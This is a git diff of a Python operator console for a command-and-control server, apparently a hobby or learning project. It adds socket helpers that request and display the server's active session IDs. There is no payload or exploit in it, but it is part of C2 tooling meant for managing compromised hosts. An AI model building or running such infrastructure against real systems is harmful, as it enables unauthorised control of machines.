@@ -1,5 +1,5 @@
 import socket
-# import struct
+import struct
 import protocol
 
 command_dispather = ["help", "exit"]
@@ -7,34 +7,55 @@ TARGET_PORT = 9000
 TARGET_IP = "127.0.0.1"
 HOST = "0.0.0.0"
 
-# def packet_formation(command):
-# #     +----------------------+----------------------+
-# #     | Command Length       | Command              |
-# #     | 4 bytes              | N bytes              |
-# #     +----------------------+----------------------+
-# #         uint32              variable
-#     command_bytes = command.encode()
-#     command_length = len(command_bytes)
-#     command_len_bytes = struct.pack(">I", command_length) # > = big endian. this is to ensure that data sent is in big endian format just like the sockets expect it so that there is uniformity in byte ordering during sending and receiving without any byte ordering issues in the server side
-#     packet_bytes = command_len_bytes + command_bytes
-#     return packet_bytes
+
+
+def display_sessionInfo(sessionId_List, sessionCount):
+    print(f"Total Active Sessions : {sessionCount}")
+    if sessionCount > 0:
+        print(f"{'Active Sessions':<30}")
+        for session_id in sessionId_List:
+            print(f"{session_id:<30}")
+    else:
+        print(f"[-] no active sessions available")
+
+
+
+def receive_exact(operator_socket, length): # function to receive the data in chunks 
+    data = b""
+    while len(data) < length:
+        chunk = operator_socket.recv(length - len(data))
+        if not chunk:
+            raise ConnectionError("c2 server closed connection")
+        data += chunk
+    return data
+
+
+
+def receive_sessionInfo(operator_socket, sessionCount_size): # deserialize sessionInfo bytes and display total sessions and session ids
+    sessionCount_Bytes = receive_exact(operator_socket, 4) # receive total number of sessions present
+    sessionCount = struct.unpack("!I", sessionCount_Bytes)[0] # !I is used to unpack network bytes (Big endian) data into Python integer
+    # struct.unpack() returns a tuple, so [0] is used to get only one value
+    sessionId_List = []
+    for _ in range(sessionCount):
+        sessionId_Bytes = receive_exact(operator_socket, 4) # receive session_id which is 4 bytes per session_id
+        session_id = struct.unpack("!I", sessionId_Bytes)[0]
+        sessionId_List.append(session_id)
+    display_sessionInfo(sessionId_List, sessionCount)
 
 
 
 def connect(command):
-    print(f"[+]starting gho$t protocol operator console")
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_console:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
         try:
-            operator_console.connect((TARGET_IP, TARGET_PORT))
-            print(f"[+] operator connected to server successfully")
+            operator_socket.connect((TARGET_IP, TARGET_PORT))
+            #print(f"[+] operator connected to server successfully")
             packet_bytes = protocol.sessions_packet_formation(command)
-            operator_console.sendall(packet_bytes)
+            operator_socket.sendall(packet_bytes)
             while True:
-                data = operator_console.recv(4096)
-                if not data:
-                    operator_console.close()
+                if command == "sessions":
+                    receive_sessionInfo(operator_socket, 4) # passing operator socket and 4 bytes cuz number of session ids are 4 bytes
                     break
         except OSError as e:
             print(f"[-]couldn't connect to c2 server")
             print(f"{e}")
-            operator_console.close()
+            operator_socket.close()
